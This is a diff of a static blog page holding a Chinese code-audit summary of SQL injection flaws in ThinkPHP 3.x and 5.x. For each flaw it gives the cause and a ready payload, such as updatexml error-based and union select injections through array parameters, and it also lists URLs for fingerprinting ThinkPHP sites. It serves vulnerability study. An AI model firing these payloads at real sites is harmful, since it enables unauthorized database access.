@@ -10,7 +10,7 @@
 <meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="代码审计 | Thinkphp3.x&#x2F;5.x框架审计总结">
-<meta property="og:url" content="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/index.html">
+<meta property="og:url" content="https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
 <meta property="og:description" content="今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。   今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注然后自己绕不过有绕过的大佬欢迎交流。 ##版本:3.x tp3.2.3">
 <meta property="og:locale" content="default">
@@ -80,16 +80,16 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&text=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&is_video=false&description=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=代码审计 | Thinkphp3.x/5.x框架审计总结&body=Check out this article: http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&name=代码审计 | Thinkphp3.x/5.x框架审计总结&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&text=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&is_video=false&description=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=代码审计 | Thinkphp3.x/5.x框架审计总结&body=Check out this article: https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&name=代码审计 | Thinkphp3.x/5.x框架审计总结&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -137,14 +137,14 @@
 <p>今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。</p>
 </blockquote>
 <hr>
-<p>今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:<br><a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注</a><br>然后自己绕不过<br><img src="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png" alt="image_1cq3l6los507172715g41e5lirp5f.png-45.9kB"><br>有绕过的大佬欢迎交流。</p>
+<p>今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:<br><a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注</a><br>然后自己绕不过<br><img src="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png" alt="image_1cq3l6los507172715g41e5lirp5f.png-45.9kB"><br>有绕过的大佬欢迎交流。</p>
 <p>##<strong>版本:3.x</strong></p>
 <p><strong>tp3.2.3 bind 注入</strong><br><strong>漏洞成因:</strong><code>当where条件可控时,parseWhereItem()的inc操作直接拼接可控值$val造成注入</code><br><strong>payload:</strong><code>id[]=bind&amp;id[]=0 and (updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
 <p><strong>tp&lt;=3.2.4 order by注入</strong><br><strong>漏洞成因:</strong><code>parseOrder()处理函数直接拼接传进来的字符串</code><br><img src="http://static.zybuluo.com/chhyx/znarexfdy7bxxmqjevut7nen/image_1cq3i0btnbs51tsp139t1q61dhn1p.png" alt="image_1cq3i0btnbs51tsp139t1q61dhn1p.png-40.8kB"><br><strong>payload:</strong><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
-<p><strong>ThinkPHP 3.2.3 find_select_delete注入</strong><br><strong>成因:</strong><code>$this-&gt;_parseOptions($options);方法进行了参数合并又没有二次校验导致的注入</code><br><strong>payload:</strong><code>?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/29/Thinkphp3.2_find_delete_selete注入分析/</a></p>
-<p>##<strong>版本:5.x</strong><br><strong>1.thinkphp5.0.9 鸡肋SQL注入(PDo预处理)+信息泄露</strong><br><strong>成因:</strong><code>debug开启造成信息泄露+parseWhereItem()的in操作对$value无过滤且直接拼接</code><br><strong>payload:</strong><code>?id[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></p>
+<p><strong>ThinkPHP 3.2.3 find_select_delete注入</strong><br><strong>成因:</strong><code>$this-&gt;_parseOptions($options);方法进行了参数合并又没有二次校验导致的注入</code><br><strong>payload:</strong><code>?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">https://p0rz9.github.io/2018/09/29/Thinkphp3.2_find_delete_selete注入分析/</a></p>
+<p>##<strong>版本:5.x</strong><br><strong>1.thinkphp5.0.9 鸡肋SQL注入(PDo预处理)+信息泄露</strong><br><strong>成因:</strong><code>debug开启造成信息泄露+parseWhereItem()的in操作对$value无过滤且直接拼接</code><br><strong>payload:</strong><code>?id[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/">https://p0rz9.github.io/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></p>
 <p><strong>2.thinkphp5.0.10 filterExp过滤不全导致注入</strong><br><strong>成因:</strong><code>助手函数input默认调用的filterExp()函数过滤不全导致注入</code><br><strong>payload:</strong><code>user[0]=not like&amp;user[1][0]=aaa&amp;user[1][8]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--</code><br><strong>参考链接:</strong><a href="http://static.zybuluo.com/chhyx/81w6j9hqbr86tcsy5wpouq26/image_1cq3gbi4g1v0n1tqc15jf12191o80p.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致注入</a></p>
-<p><strong>3.thinkphp5.0.14/15   insert/update注入(鸡肋)</strong><br><strong>成因:</strong><code>若传入参数为inc,parseData()函数会将将$val[1]与$val[2]拼接直接拼接导致注入</code><br><strong>payload:</strong><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP框架%205.0.x%20sql注入</a></p>
+<p><strong>3.thinkphp5.0.14/15   insert/update注入(鸡肋)</strong><br><strong>成因:</strong><code>若传入参数为inc,parseData()函数会将将$val[1]与$val[2]拼接直接拼接导致注入</code><br><strong>payload:</strong><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/">https://p0rz9.github.io/2018/09/15/ThinkPHP框架%205.0.x%20sql注入</a></p>
 <p><strong>4.thinkphp5.x order by注入(鸡肋)</strong><br><strong>成因:</strong><code>与tp&lt;=3.2.4 order by注入成因类似</code><br><strong>payload:</strong><code>order[id</code>, 2) and updatexml(1,concat(0x3a,user()),1)– a][0]=111`<br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
 <p><strong>识别基于THINKPHP框架的CMS:</strong></p>
 <pre><code>http://xxxx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a
@@ -182,16 +182,16 @@ http://xxxx/ThinkPHP/LICENSE.txt
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&text=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&is_video=false&description=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=代码审计 | Thinkphp3.x/5.x框架审计总结&body=Check out this article: http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/&name=代码审计 | Thinkphp3.x/5.x框架审计总结&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&text=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&is_video=false&description=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=代码审计 | Thinkphp3.x/5.x框架审计总结&body=Check out this article: https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&title=代码审计 | Thinkphp3.x/5.x框架审计总结"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://p0rz9.github.io/2018/10/18/Thinkphp3.x_5.x框架审计总结/&name=代码审计 | Thinkphp3.x/5.x框架审计总结&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
